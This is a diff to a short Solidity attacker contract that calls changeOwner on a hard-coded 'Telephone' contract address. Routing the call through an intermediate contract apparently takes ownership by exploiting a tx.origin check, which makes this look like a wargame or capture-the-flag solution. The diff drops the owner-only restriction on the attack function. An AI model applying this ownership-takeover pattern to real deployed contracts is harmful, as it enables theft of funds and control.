@@ -1,17 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
-import "@openzeppelin/contracts/access/Ownable.sol";
-
 abstract contract Telephone {
     function changeOwner(address _owner) public virtual;
 }
 
-contract Attacker4 is Ownable {
-    Telephone targetContract =
-        Telephone(0xd2A0bE0fd1543C051Cee56c4101f807c05b170eB);
+contract Attacker4 {
+    Telephone target = Telephone(0x90429046BD403440B6a3672A4eFdcfA922650115);
 
-    function attack() external onlyOwner {
-        targetContract.changeOwner(msg.sender);
+    function attack() external {
+        target.changeOwner(msg.sender);
     }
 }
